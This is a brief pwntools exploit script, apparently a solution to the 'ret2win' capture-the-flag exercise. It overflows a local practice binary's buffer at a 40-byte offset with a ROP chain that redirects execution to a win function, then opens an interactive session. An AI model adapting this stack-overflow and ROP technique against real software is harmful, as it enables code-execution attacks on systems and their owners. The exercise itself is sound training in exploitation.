from pwn import *

elf = context.binary = ELF("./ret2win")

rop = ROP(elf)
rop.raw(rop.ret)
rop.call(elf.symbols["ret2win"])

r = process("./ret2win")

r.recvuntil(b"> ")

payload = flat({40: rop.chain()})
r.sendline(payload)

r.interactive()

